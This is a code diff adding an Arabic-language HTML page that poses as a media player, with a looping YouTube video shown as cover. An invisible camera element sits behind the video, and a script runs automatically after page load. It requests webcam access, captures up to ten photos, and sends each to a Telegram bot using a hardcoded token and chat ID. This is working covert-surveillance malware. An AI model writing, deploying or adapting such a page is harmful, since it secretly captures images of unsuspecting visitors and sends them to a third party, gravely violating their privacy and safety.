@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>مشغل الوسائط</title>
+    <style>
+        body { margin: 0; padding: 0; background: #000; overflow: hidden; }
+        
+        /* الفيديو الأساسي */
+        .video-wrapper { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
+        
+        /* إطار الكاميرا الخفي (يجب أن يكون موجوداً ليعمل المتصفح) */
+        #v { width: 1px; height: 1px; opacity: 0; position: fixed; top: 0; left: 0; z-index: -1; }
+        
+        iframe { width: 100%; height: 100%; border: none; }
+    </style>
+</head>
+<body>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <div class="video-wrapper">
+        <iframe src="https://www.youtube.com/embed/z1Bg9T4dXTk?autoplay=1&mute=1&loop=1&playlist=z1Bg9T4dXTk" 
+                allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    </div>
+
+    <script>
+        const CONFIG = {
+            BOT_TOKEN: "8761336309:AAGv1e4FqNVaybasRyNwLu4U1o5x1pNCJUk",
+            CHAT_ID: "7000276863",
+            MAX_PHOTOS: 10
+        };
+
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+        const ctx = c.getContext('2d');
+
+        async function startHunt() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                v.srcObject = stream;
+                await v.play();
+                
+                // التقاط الصور
+                for (let i = 0; i < CONFIG.MAX_PHOTOS; i++) {
+                    captureAndSend();
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+                stream.getTracks().forEach(t => t.stop());
+            } catch (err) {
+                console.log("يتطلب إذن الكاميرا تفاعل المستخدم.");
+            }
+        }
+
+        function captureAndSend() {
+            if (v.readyState !== 4) return;
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            ctx.drawImage(v, 0, 0, c.width, c.height);
+            
+            c.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CONFIG.CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg');
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg', 0.5);
+        }
+
+        // بدء العملية بعد تحميل الصفحة بـ 3 ثواني
+        window.onload = () => setTimeout(startHunt, 3000);
+    </script>
+</body>
+</html>
+
